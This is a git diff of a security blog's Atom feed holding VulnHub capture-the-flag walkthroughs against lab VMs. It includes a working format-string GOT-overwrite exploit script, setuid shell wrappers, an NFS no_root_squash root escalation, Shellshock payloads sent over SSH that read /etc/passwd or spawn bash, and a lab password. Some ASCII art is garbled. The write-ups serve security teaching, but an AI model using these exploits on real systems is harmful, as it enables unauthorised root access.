@@ -4,7 +4,7 @@
   <title><![CDATA[Category: vm's | FourFourFourFour]]></title>
   <link href="http://recrudesce.github.io/blog/categories/vms/atom.xml" rel="self"/>
   <link href="http://recrudesce.github.io/"/>
-  <updated>2015-01-02T00:24:25+00:00</updated>
+  <updated>2015-01-02T00:29:52+00:00</updated>
   <id>http://recrudesce.github.io/</id>
   <author>
     <name><![CDATA[recrudesce]]></name>
@@ -33,7 +33,7 @@
 
 <p>An NMAP scan shows that the VM only has a few ports open that are of interest - 22 and 8088</p>
 
-<pre><code>root@kali:~# nmap -sS -p- -T5 172.16.231.132
+<pre><code class="bash">root@kali:~# nmap -sS -p- -T5 172.16.231.132
 
 Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-19 13:31 GMT
 Nmap scan report for 172.16.231.132
@@ -107,7 +107,7 @@ int main(void)
 
 <p>A quick NMAP scan confirms port 4444 has been opened.</p>
 
-<pre><code>root@kali:~# nmap -sS -p4444 -T5 172.16.231.132
+<pre><code class="bash">root@kali:~# nmap -sS -p4444 -T5 172.16.231.132
 
 Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-19 13:47 GMT
 Nmap scan report for 172.16.231.132
@@ -122,7 +122,7 @@ root@kali:~#
 
 <p>A quick connection to the port via Netcat and a bit of Python allow us to get a TTY enabled shell.</p>
 
-<pre><code>root@kali:~# nc -nv 172.16.231.132 4444
+<pre><code class="bash">root@kali:~# nc -nv 172.16.231.132 4444
 (UNKNOWN) [172.16.231.132] 4444 (?) open
 python -c 'import pty;pty.spawn("/bin/bash")'
 mike@pegasus:/home/mike$ id
@@ -137,101 +137,88 @@ mike@pegasus:/home/mike$
 
 <p>So as user &ldquo;mike&rdquo;, I started poking around in the setuid binary &ldquo;my_first&rdquo;. It seemed to be some sort of C program with several functions:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-mike@pegasus:~$ ./my_first</p>
-
-<h2>WELCOME TO MY FIRST TEST PROGRAM</h2>
-
-<p>Select your tool:
+<pre><code class="bash">mike@pegasus:~$ ./my_first
+WELCOME TO MY FIRST TEST PROGRAM
+--------------------------------
+Select your tool:
 [1] Calculator
 [2] String replay
 [3] String reverse
 [4] Exit
-[/plain]</p>
+[/plain]
 
-<p>The mail in /var/mail/mike mentions a git repo with the source code. We started attacking the binary without looking at the code, because the vulnerability jumped up quickly. The third option was not implemented and the reverse string operation seemed to be secure. I then went for the calculator, entering:</p>
+The mail in /var/mail/mike mentions a git repo with the source code. We started attacking the binary without looking at the code, because the vulnerability jumped up quickly. The third option was not implemented and the reverse string operation seemed to be secure. I then went for the calculator, entering:
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-Selection: 1</p>
+[plain gutter="false"]
+Selection: 1
 
-<p>Enter first number: 5
+Enter first number: 5
 Enter second number: AAAA
 Error details: AAAA
-[/plain]</p>
+</code></pre>
 
 <p>That seemed promising. I entered:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-Selection: 1</p>
+<pre><code class="bash">Selection: 1
 
-<p>Enter first number: 5
+Enter first number: 5
 Enter second number: %x
 Error details: bff1039c
-[/plain]</p>
+</code></pre>
 
 <p>And we have our format string vulnerability! The basic idea now was to abuse it and overwrite a got pointer. I chose printf as the target and I wanted to overwrite it with the address of system. ASLR was enabled on pegasus, but because it is a 32 bit box, we can easily &ldquo;fix&rdquo; this with <code>ulimit -s unlimited</code>. This enlarges the stack and fixes the address of libc:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-mike@pegasus:~$ ulimit -s unlimited
+<pre><code class="bash">mike@pegasus:~$ ulimit -s unlimited
 mike@pegasus:~$ ldd my_first
-    linux-gate.so.1 =>  (0x40022000)
-    libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x4002a000)
+    linux-gate.so.1 =&gt;  (0x40022000)
+    libc.so.6 =&gt; /lib/i386-linux-gnu/libc.so.6 (0x4002a000)
     /lib/ld-linux.so.2 (0x40000000)
-[/plain]</p>
+</code></pre>
 
 <p>Finding the address of system within gdb was trivial. The got pointer address can be found using objdump:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-080483b0 &lt;printf@plt>:
+<pre><code class="bash">080483b0 &lt;printf@plt&gt;:
  80483b0:   ff 25 fc 9b 04 08       jmp    *0x8049bfc
  80483b6:   68 00 00 00 00          push   $0x0
- 80483bb:   e9 e0 ff ff ff          jmp    80483a0 &lt;_init+0x2c>
-[/plain]</p>
+ 80483bb:   e9 e0 ff ff ff          jmp    80483a0 &lt;_init+0x2c&gt;
+</code></pre>
 
 <p>So it&rsquo;s at 0x8049bfc. Now we needed to find the start of the format string on the stack. Recrudesce quickly identified it as argument number 8:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-Selection: 1</p>
+<pre><code class="bash">Selection: 1
 
-<p>Enter first number: 5
+Enter first number: 5
 Enter second number: AAAA%8$x
 Error details: AAAA41414141
-[/plain]</p>
+</code></pre>
 
 <p>So I got working on an exploit. I quickly came up with this python script:</p>
 
-<p>[python]</p>
+<pre><code class="python">#!/usr/bin/python
+import struct
 
-<h1>!/usr/bin/python</h1>
+def p(x):
+  return struct.pack("&lt;L", x)
 
-<p>import struct</p>
+payload = ""
 
-<p>def p(x):
-  return struct.pack(&ldquo;&lt;L&rdquo;, x)</p>
+# start calculator thingie
+payload += "1\n5\n"
 
-<p>payload = &ldquo;&rdquo;</p>
+# overwrite first part of got pointer
+payload += p(0x8049bfe)
+payload += "%16386c%8$hn"
 
-<h1>start calculator thingie</h1>
+# overwrite second part of got pointer
+payload += p(0x8049bfc)
+payload += "%20566c%12$hn"
 
-<p>payload += &ldquo;1\n5\n&rdquo;</p>
+payload += "\n"
 
-<h1>overwrite first part of got pointer</h1>
-
-<p>payload += p(0x8049bfe)
-payload += &ldquo;%16386c%8$hn&rdquo;</p>
-
-<h1>overwrite second part of got pointer</h1>
-
-<p>payload += p(0x8049bfc)
-payload += &ldquo;%20566c%12$hn&rdquo;</p>
-
-<p>payload += &ldquo;\n&rdquo;</p>
-
-<h1>exit program</h1>
-
-<p>payload += &ldquo;4\n&rdquo;
+# exit program
+payload += "4\n"
 print payload
-[/python]</p>
+</code></pre>
 
 <p>The format string first writes some dummy bytes and then overwrites the first part of the got pointer. It takes the 8th argument off the stack and uses %hn to write a half-nibble to that address. The value is the number of bytes that have been written.</p>
 
@@ -239,86 +226,78 @@ print payload
 
 <p>So if we run this exploit, the next time printf() will be called by the binary, it will call system() instead!</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-mike@pegasus:~$ python exploit.py | ./my_first</p>
+<pre><code class="bash">mike@pegasus:~$ python exploit.py | ./my_first
 
-<p>&hellip;snip&hellip;</p>
+...snip...
 
-<p>sh: 1: Selection:: not found</p>
+sh: 1: Selection:: not found
 
-<p>Goodbye!
-[/plain]</p>
+Goodbye!
+</code></pre>
 
 <p>OK, we have system() being called! So to fully exploit it and grant us a shell, we make a symlink to /bin/dash and call it &ldquo;Selection:&rdquo;. Finally we need to set the PATH environment variable so that the shell searches in the current directory and finds our symlink. The exploit is pushed to the binary via stdin and the cat command then catches the shell that is being spawned (otherwise it closes immediately).</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-mike@pegasus:~$ ln -s /bin/dash Selection:
-mike@pegasus:~$ export PATH=&ldquo;.:$PATH&rdquo;
+<pre><code class="bash">mike@pegasus:~$ ln -s /bin/dash Selection:
+mike@pegasus:~$ export PATH=".:$PATH"
 mike@pegasus:~$ ulimit -s unlimited
-mike@pegasus:~$ (python ./exploit.py; cat) | ./my_first</p>
+mike@pegasus:~$ (python ./exploit.py; cat) | ./my_first 
 
-<p>&hellip;snip&hellip;</p>
+...snip...
 
-<p>id
+id
 uid=1001(mike) gid=1001(mike) euid=1000(john) groups=1000(john),1001(mike)
-[/plain]</p>
+</code></pre>
 
 <p>So we now have a shell as john! I wanted to spawn another shell (using python) to get a pty, but it wouldn&rsquo;t let me:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
+<pre><code class="bash">python -c 'import pty;pty.spawn("/bin/bash")'
 Traceback (most recent call last):
-  File &ldquo;<string>&rdquo;, line 1, in <module>
-  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 165, in spawn
+  File "&lt;string&gt;", line 1, in &lt;module&gt;
+  File "/usr/lib/python2.7/pty.py", line 165, in spawn
     pid, master_fd = fork()
-  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 107, in fork
+  File "/usr/lib/python2.7/pty.py", line 107, in fork
     master_fd, slave_fd = openpty()
-  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 29, in openpty
-    master_fd, slave_name = <em>open_terminal()
-  File &ldquo;/usr/lib/python2.7/pty.py&rdquo;, line 70, in </em>open_terminal
-    raise os.error, &lsquo;out of pty devices&rsquo;
+  File "/usr/lib/python2.7/pty.py", line 29, in openpty
+    master_fd, slave_name = _open_terminal()
+  File "/usr/lib/python2.7/pty.py", line 70, in _open_terminal
+    raise os.error, 'out of pty devices'
 OSError: out of pty devices
-[/plain]</p>
+</code></pre>
 
 <p>This is probably because our little trainee &ldquo;mike&rdquo; is not a real person and is using up all our pty&rsquo;s! No problem, we thought, let&rsquo;s upload our ssh keys&hellip; only that failed, because our gid is set to mike and not john. Hmmm.. I wrote a small C wrapper to try and set gid and uid to 1000 (john) but it wouldn&rsquo;t let me set gid.</p>
 
-<p>[c]</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
 
-<h1>include &lt;stdio.h></h1>
-
-<h1>include &lt;stdlib.h></h1>
-
-<p>int main(int argc, char *argv[]){
+int main(int argc, char *argv[]){
 setreuid(geteuid(), geteuid());
-setregid(geteuid(), geteuid());</p>
+setregid(geteuid(), geteuid());
 
-<p>execv(&ldquo;/bin/dash&rdquo;, argv);
+execv("/bin/dash", argv);
 return 0;
 }
-[/c]</p>
+</code></pre>
 
 <p>But this did have the nice side-effect of allowing us a to spawn a pty shell!</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-/tmp/a.out
+<pre><code class="bash">/tmp/a.out
 id
 uid=1000(john) gid=1001(mike) groups=1000(john),1001(mike)
-python -c &lsquo;import pty;pty.spawn(&ldquo;/bin/bash&rdquo;)&rsquo;
+python -c 'import pty;pty.spawn("/bin/bash")'
 john@pegasus:~$ sudo -l
 sudo -l
 Matching Defaults entries for john on this host:
     env_reset,
-    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p>
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
 
-<p>User john may run the following commands on this host:
+User john may run the following commands on this host:
     (root) NOPASSWD: /usr/local/sbin/nfs
-[/plain]</p>
+</code></pre>
 
 <p>Nice! Now we can see that john is allowed to start the nfs daemon&hellip; Interesting, because /etc/exports lists the following entry:</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-/opt/nfs    *(rw,sync,crossmnt,no_subtree_check,no_root_squash
-[/plain]</p>
+<pre><code class="bash">/opt/nfs    *(rw,sync,crossmnt,no_subtree_check,no_root_squash
+</code></pre>
 
 <p>no_root_squash&hellip; we can mount it remotely and have our own uid! NFS will not set it to nobody:nobody&hellip;</p>
 
@@ -332,81 +311,75 @@ Matching Defaults entries for john on this host:
 
 <p>So, NFS huh ? What can I do with that ? <em>thinks</em>&hellip; well, I can mount it remotely and drop a file as root on my Kali box, suid the binary and execute it on Pegasus as john.</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@kali:~# mount -t nfs 172.16.231.132:/opt/nfs /mnt/nfs
+<pre><code class="bash">root@kali:~# mount -t nfs 172.16.231.132:/opt/nfs /mnt/nfs
 root@kali:~# cd /mnt/nfs
 root@kali:/mnt/nfs# ls -la
 total 8
 drwxr-xr-x 2 root root 4096 Nov 18 03:43 .
 drwxr-xr-x 4 root root 4096 Dec 19 13:09 ..
-[/plain]</p>
+</code></pre>
 
 <p>OK, so a quick side note here - my Kali box is 64 bit&hellip; if it were 32 bit I could just copy /bin/sh to /mnt/nfs and suid it. So, in this case, I have to use a C wrapper to execute a shell instead.</p>
 
 <p>The code for the C wrapper is pretty straight forward</p>
 
-<p>[c]
-int main(void)
+<pre><code class="c">int main(void)
 {
-        system(&ldquo;/bin/dash&rdquo;);
+        system("/bin/dash");
 }
-[/c]</p>
+</code></pre>
 
 <p>This is then compiled as a 32 bit binary, dropped into /mnt/nfs on my Kali box, and chmodded to 4777</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-root@kali:/mnt/nfs# gcc wrapper.c -m32
+<pre><code class="bash">root@kali:/mnt/nfs# gcc wrapper.c -m32
 root@kali:/mnt/nfs# chmod 4777 a.out
-[/plain]</p>
+</code></pre>
 
 <p>Which, when executed as user john, drops me to a root shell</p>
 
-<p>[plain gutter=&ldquo;false&rdquo;]
-john@pegasus:/opt/nfs$ ls -la
+<pre><code class="bash">john@pegasus:/opt/nfs$ ls -la
 ls -la
 total 32
 drwxr-xr-x 2 root root 4096 Dec 20 00:17 .
 drwxr-xr-x 5 root root 4096 Nov 18 20:51 ..
 -rwsrwxrwx 1 root root 7160 Dec 20 00:17 a.out
 john@pegasus:/opt/nfs$ ./moo2
-./a.out</p>
+./a.out
+# id
+uid=1000(john) gid=1001(mike) euid=0(root) groups=0(root),1001(mike)
+``
 
-<h1>id</h1>
-
-<p>uid=1000(john) gid=1001(mike) euid=0(root) groups=0(root),1001(mike)
-[/plain]</p>
-
-<p>Allowing the grail of grails&hellip; the ability to cat /root/flag</p>
-
-<p>[plain gutter=&ldquo;false&rdquo;]</p>
+Allowing the grail of grails... the ability to cat /root/flag
+</code></pre>
 
 <h1>cat flag</h1>
 
-<p>cat flag
-               ,
-               |<code>\
-              /'_/_
-            ,'_/\_/\_                       ,
-          ,'_/\'_\_,/_                    ,'|
-        ,'_/\_'_ \_ \_/                _,-'_/
-      ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
-    ,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek
-   ( (' )\/(_ \_ \'_,\   __--' _,-_/_,-',_/ _\      mythology. He is a winged
-    \_</code>> 6<code>7  \'_,/ ,-' _,-,'\,_'_ \,_/'_,\       stallion usually depicted
-     \/-  _/ 7 '/ _,' _/'\_  \,_'_ \_ \'_,/         as pure white in color.
-      \_'/&gt;   7'_/' _/' \_ '\,_'_ \_ \'_,\          Symbol of wisdom and fame.
-        &gt;/  _ ,V  ,&lt;  \__ '\,_'_ \_ \'_,/
-      /'_  ( )_)\/-,',__ '\,_'_,\_,\'_\             Fun fact: Pegasus was also
-     ( ) \_ \|_ </code>_    _,/&lsquo;\,<em>&rsquo;</em>,/&lsquo;               a video game system sold in
-      \<em>  __)    <code>\_                             Poland, Serbia and Bosnia.
-       \_)   &gt;       </code>_                           It was a hardware clone of
-            /  <code>,      |</code>_                         the Nintendo Famicom.
-           /    \     / \ <code>\
-          /   __/|   /  / </code>\
-         (<code> (   (</code> (</em>  \   /
+<pre><code>           ,
+           |`\
+          /'_/_
+        ,'_/\_/\_                       ,
+      ,'_/\'_\_,/_                    ,'|
+    ,'_/\_'_ \_ \_/                _,-'_/
+  ,'_/'\_'_ \_ \'_,\           _,-'_,-/ \,      Pegasus is one of the best
+,' /_\ _'_ \_ \'_,/       __,-'&lt;_,' _,\_,/      known creatures in Greek
+</code></pre>
+
+<p>   ( (&lsquo; )\/(<em> _ \&rsquo;</em>,\   <strong>&ndash;&lsquo; <em>,-</em>/<em>,-&rsquo;,</em>/ <em>\      mythology. He is a winged
+    _<code>\&gt; 6</code> 7  \&lsquo;</em>,/ ,-&rsquo; <em>,-,&lsquo;\,</em>&rsquo;<em> \,</em>/&lsquo;<em>,\       stallion usually depicted
+     \/-  </em>/ 7 &rsquo;/ <em>,&lsquo; </em>/&rsquo;_  \,<em>&lsquo;</em> _ \&rsquo;<em>,/         as pure white in color.
+      _&lsquo;/>   7&rsquo;</em>/&lsquo; <em>/&rsquo; _ &lsquo;\,</em>&rsquo;<em> _ \&lsquo;</em>,\          Symbol of wisdom and fame.
+        >/  _ ,V  ,&lt;  _<em> &rsquo;\,</em>&lsquo;<em> _ \&rsquo;</em>,/
+      /&lsquo;<em>  ( )</em>)\/-,&rsquo;,</strong> &lsquo;\,<em>&rsquo;</em>,_,\&lsquo;<em>\             Fun fact: Pegasus was also
+     ( ) _ |</em>  <code>\_    \_,/'\,_'_,/'               a video game system sold in
+      \\_  \_\_)   </code>_                             Poland, Serbia and Bosnia.
+       _)   >        <code>\_                           It was a hardware clone of
+            / </code>,      |<code>\_                         the Nintendo Famicom.
+           /    \     / \</code>\
+          /   <strong>/|   /  /  <code>\
+         (</code>  (   (<code>(_  \   /
          /  ,/    |  /  /   \
-        / ,/      | /   \   `_
-      <em>/</em>/        |/    /<em><em>/,</em>/
+        / ,/      | /   \  </code>_
+      <em>/</em>/        |/    /</strong>/,<em>/
      /</em>(         /_(</p>
 
 <p>CONGRATULATIONS! You made it :)</p>
@@ -422,7 +395,7 @@ and leave some feedback, I would love to hear from you!</p>
 
 <p>Also, make sure to follow @VulnHub on Twitter and keep checking vulnhub.com for
 more awesome boot2root VMs!
-[/plain]</p>
+&#8220;`</p>
 
 <p><img src="http://media.tumblr.com/tumblr_m7bmngSpkh1rs4olx.gif" alt="" /></p>
 ]]></content>
@@ -662,8 +635,8 @@ root@pwk:~#
 <p>These credentials can be used to SSH into the VM, which allows us to take a quick look around.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#x6a;&#97;&#115;&#x6f;&#110;&#64;&#x31;&#55;&#50;&#46;&#x31;&#54;&#x2e;&#53;&#54;&#x2e;&#49;&#51;&#57;">&#106;&#x61;&#x73;&#111;&#110;&#64;&#x31;&#55;&#50;&#46;&#x31;&#54;&#x2e;&#x35;&#54;&#x2e;&#x31;&#x33;&#57;</a>
-<a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#106;&#97;&#x73;&#111;&#110;&#x40;&#x31;&#x37;&#50;&#46;&#x31;&#x36;&#46;&#x35;&#54;&#x2e;&#x31;&#x33;&#x39;">&#106;&#97;&#115;&#x6f;&#x6e;&#64;&#49;&#55;&#x32;&#46;&#49;&#54;&#x2e;&#53;&#x36;&#x2e;&#49;&#x33;&#x39;</a>&rsquo;s password: jB9jP2knf
+root@pwk:~# ssh <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#111;&#x3a;&#106;&#97;&#115;&#x6f;&#x6e;&#x40;&#x31;&#x37;&#50;&#x2e;&#x31;&#x36;&#x2e;&#x35;&#x36;&#x2e;&#x31;&#51;&#57;">&#106;&#x61;&#115;&#111;&#110;&#64;&#49;&#x37;&#x32;&#46;&#49;&#x36;&#x2e;&#53;&#x36;&#46;&#x31;&#51;&#x39;</a>
+<a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#x6a;&#x61;&#115;&#x6f;&#110;&#64;&#49;&#55;&#50;&#46;&#49;&#54;&#x2e;&#x35;&#x36;&#x2e;&#49;&#51;&#x39;">&#x6a;&#97;&#115;&#x6f;&#x6e;&#64;&#49;&#55;&#50;&#x2e;&#49;&#x36;&#46;&#x35;&#x36;&#x2e;&#x31;&#x33;&#x39;</a>&rsquo;s password: jB9jP2knf
 Linux knockknock 3.2.0-4-486 #1 Debian 3.2.60-1+deb7u3 i686</p>
 
 <p>The programs included with the Debian GNU/Linux system are free software;
@@ -1309,7 +1282,7 @@ login        login to shell with specified username and password</p>
 <p>With the binary now available offline, we can go about working out what it does. It&rsquo;s a CGI binary, so we can interact with it via the command line using the QUERY_STRING environment value. Lets set something really simple first. I&rsquo;ve purposefully not included any GDB stuff here, as an excuse for you to work it out and learn :)</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# export QUERY_STRING=&ldquo;name=Me&amp;surname=Me&amp;Description=Me2&amp;uploadfield=Blah&amp;email=<a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#109;&#101;&#x40;&#109;&#x65;&#x2e;&#99;&#111;&#109;">&#x6d;&#101;&#64;&#x6d;&#101;&#x2e;&#99;&#111;&#109;</a>&rdquo;
+root@pwk:~# export QUERY_STRING=&ldquo;name=Me&amp;surname=Me&amp;Description=Me2&amp;uploadfield=Blah&amp;email=<a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#x6d;&#101;&#x40;&#x6d;&#101;&#x2e;&#x63;&#111;&#109;">&#109;&#x65;&#64;&#109;&#x65;&#46;&#99;&#111;&#109;</a>&rdquo;
 root@pwk:~# ./owlbin
 Content-type: text/plain</p>
 
@@ -1358,7 +1331,7 @@ uid=1000(rmp) gid=1000(rmp) groups=1000(rmp),24(cdrom),25(floppy),29(audio),30(d
 <p>Once a public key is added to authorized_hosts, we can SSH in and obtain a full TTY shell.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-$ ssh <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#58;&#114;&#x6d;&#x70;&#64;&#49;&#55;&#x32;&#x2e;&#x31;&#x36;&#46;&#53;&#x36;&#46;&#49;&#x33;&#x31;">&#x72;&#109;&#x70;&#64;&#49;&#x37;&#50;&#x2e;&#x31;&#x36;&#46;&#53;&#54;&#46;&#49;&#x33;&#x31;</a>
+$ ssh <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x72;&#x6d;&#112;&#x40;&#49;&#x37;&#50;&#46;&#x31;&#x36;&#46;&#53;&#54;&#x2e;&#49;&#x33;&#49;">&#x72;&#x6d;&#x70;&#x40;&#49;&#x37;&#x32;&#46;&#49;&#x36;&#x2e;&#53;&#x36;&#46;&#x31;&#51;&#x31;</a>
 The authenticity of host &lsquo;172.16.56.131 (172.16.56.131)&rsquo; can&rsquo;t be established.
 RSA key fingerprint is c0:f8:4e:c6:f9:28:14:5b:c3:ed:8a:00:51:aa:82:d5.
 Are you sure you want to continue connecting (yes/no)? yes
@@ -1799,7 +1772,7 @@ zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
 <p>It is possible to SSH into the VM using the noob user, as per the key&rsquo;s filename, but we are immediately disconnected.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh -i key.key <a href="&#x6d;&#97;&#105;&#108;&#x74;&#x6f;&#x3a;&#x6e;&#111;&#111;&#98;&#64;&#x31;&#x37;&#x32;&#46;&#49;&#x36;&#46;&#x35;&#x36;&#x2e;&#x31;&#x33;&#x38;">&#x6e;&#x6f;&#111;&#98;&#64;&#x31;&#x37;&#50;&#x2e;&#x31;&#x36;&#x2e;&#53;&#x36;&#x2e;&#49;&#x33;&#x38;</a>
+root@pwk:~# ssh -i key.key <a href="&#x6d;&#97;&#105;&#x6c;&#116;&#x6f;&#x3a;&#x6e;&#x6f;&#x6f;&#98;&#64;&#49;&#55;&#x32;&#46;&#x31;&#54;&#46;&#53;&#x36;&#46;&#49;&#x33;&#x38;">&#110;&#111;&#111;&#x62;&#64;&#x31;&#55;&#50;&#x2e;&#49;&#54;&#x2e;&#x35;&#x36;&#46;&#49;&#x33;&#56;</a>
 TRY HARDER LOL!
 Connection to 172.16.56.138 closed.
 root@pwk:~#
@@ -1808,7 +1781,7 @@ root@pwk:~#
 <p>Standard things here like &ndash;norc don&rsquo;t work, so lets try something new. SHELLSHOCK !</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh -i key.key <a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#x6e;&#111;&#111;&#98;&#x40;&#x31;&#55;&#50;&#x2e;&#49;&#54;&#x2e;&#x35;&#x36;&#46;&#49;&#51;&#x38;">&#110;&#x6f;&#111;&#98;&#64;&#49;&#55;&#50;&#x2e;&#49;&#54;&#x2e;&#x35;&#54;&#x2e;&#x31;&#51;&#56;</a> &lsquo;() { :;}; cat /etc/passwd&rsquo;
+root@pwk:~# ssh -i key.key <a href="&#x6d;&#x61;&#x69;&#x6c;&#116;&#x6f;&#x3a;&#110;&#x6f;&#x6f;&#98;&#64;&#49;&#55;&#50;&#46;&#49;&#54;&#x2e;&#53;&#54;&#x2e;&#49;&#51;&#56;">&#x6e;&#111;&#111;&#98;&#x40;&#x31;&#x37;&#x32;&#46;&#49;&#x36;&#46;&#x35;&#54;&#x2e;&#49;&#51;&#x38;</a> &lsquo;() { :;}; cat /etc/passwd&rsquo;
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
@@ -1841,7 +1814,7 @@ root@pwk:~#
 <p>Yup, we can get a shell with this using &lsquo;() { :;}; /bin/bash&rsquo;</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh -i key.key <a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#x3a;&#x6e;&#111;&#x6f;&#x62;&#64;&#x31;&#x37;&#50;&#x2e;&#49;&#54;&#x2e;&#53;&#x36;&#46;&#x31;&#x33;&#56;">&#110;&#x6f;&#x6f;&#x62;&#64;&#49;&#x37;&#50;&#46;&#x31;&#x36;&#x2e;&#53;&#54;&#x2e;&#49;&#51;&#56;</a> &lsquo;() { :;}; /bin/bash&rsquo;
+root@pwk:~# ssh -i key.key <a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x6e;&#x6f;&#x6f;&#98;&#x40;&#x31;&#x37;&#x32;&#46;&#x31;&#x36;&#x2e;&#53;&#54;&#x2e;&#49;&#x33;&#x38;">&#x6e;&#x6f;&#111;&#x62;&#64;&#x31;&#55;&#x32;&#46;&#x31;&#54;&#x2e;&#x35;&#x36;&#46;&#x31;&#x33;&#56;</a> &lsquo;() { :;}; /bin/bash&rsquo;
 id
 uid=1002(noob) gid=1002(noob) groups=1002(noob)
 [/plain]</p>
@@ -2140,7 +2113,7 @@ OK: wut ?</p>
 <p><img src="http://static.fjcdn.com/gifs/MFW+someone+tries+to+open+IE.+that+makes+me+a_c3c81f_4698730.gif" alt="" /> OK, so not knowing the password, I decided to check out SSH.</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#111;&#58;&#98;&#x6c;&#97;&#x68;&#x40;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#x2e;&#x30;&#46;&#x31;&#48;&#54;">&#x62;&#108;&#x61;&#x68;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x30;&#x2e;&#x31;&#48;&#54;</a></p>
+root@pwk:~# ssh <a href="&#109;&#x61;&#x69;&#108;&#116;&#111;&#x3a;&#x62;&#108;&#x61;&#x68;&#64;&#49;&#x39;&#x32;&#x2e;&#49;&#x36;&#56;&#46;&#48;&#x2e;&#x31;&#48;&#54;">&#x62;&#108;&#x61;&#104;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#48;&#x2e;&#x31;&#x30;&#x36;</a></p>
 
 <p>\x56\x6d\x30\x77\x64\x32\x51\x79\x55\x58\x6c\x56\x57\x47\x78\x57\x56\x30\x64\x34
 \x56\x31\x59\x77\x5a\x44\x52\x57\x4d\x56\x6c\x33\x57\x6b\x52\x53\x57\x46\x4a\x74
@@ -2249,7 +2222,7 @@ o888oo   888  oooo   .ooooo.   888  oooo
  888     888   888  888   .o8  888 <code>88b.
 o888o   o888o o888o</code>Y8bod8P&#8217; o888o o888o</p>
 
-<p><a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#x62;&#108;&#97;&#104;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#x2e;&#x30;&#x2e;&#49;&#x30;&#x36;">&#x62;&#108;&#97;&#x68;&#x40;&#x31;&#x39;&#50;&#46;&#x31;&#54;&#x38;&#x2e;&#x30;&#46;&#x31;&#x30;&#54;</a>&rsquo;s password: [/plain]</p>
+<p><a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#x62;&#x6c;&#97;&#x68;&#x40;&#x31;&#57;&#x32;&#46;&#49;&#x36;&#x38;&#46;&#x30;&#x2e;&#x31;&#48;&#54;">&#98;&#108;&#97;&#x68;&#64;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#46;&#x30;&#46;&#49;&#48;&#x36;</a>&rsquo;s password: [/plain]</p>
 
 <p>OK, that&rsquo;s something - I&rsquo;m intrigued to see what the hex decodes to</p>
 
@@ -2626,7 +2599,7 @@ sqlite>
 <p>I know that the users Robin and Dean exist, so I decided to try the above passwords</p>
 
 <p>[plain gutter=&ldquo;false&rdquo;]
-root@pwk:~# ssh <a href="&#109;&#97;&#x69;&#108;&#x74;&#x6f;&#x3a;&#x72;&#111;&#98;&#x69;&#x6e;&#x40;&#x31;&#57;&#50;&#46;&#x31;&#x36;&#x38;&#x2e;&#x30;&#46;&#x31;&#48;&#x36;">&#114;&#111;&#98;&#x69;&#x6e;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#46;&#48;&#46;&#x31;&#48;&#x36;</a></p>
